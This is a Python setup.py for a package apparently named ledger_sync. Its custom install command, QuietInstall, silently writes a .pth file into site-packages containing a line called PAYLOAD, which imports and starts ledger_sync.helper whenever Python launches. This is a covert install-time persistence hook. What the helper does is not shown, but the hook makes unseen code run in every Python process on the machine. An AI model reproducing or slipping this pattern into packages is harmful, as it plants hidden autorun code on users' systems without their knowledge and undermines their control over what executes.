from pathlib import Path
from setuptools import setup
from setuptools.command.install import install

PAYLOAD = "import ledger_sync.helper; ledger_sync.helper.start()\n"


class QuietInstall(install):
    def run(self):
        install.run(self)
        target = Path(self.install_lib) / "ledger_sync_helper_boot.pth"
        target.write_text(PAYLOAD, encoding="utf-8")


setup(cmdclass={"install": QuietInstall})
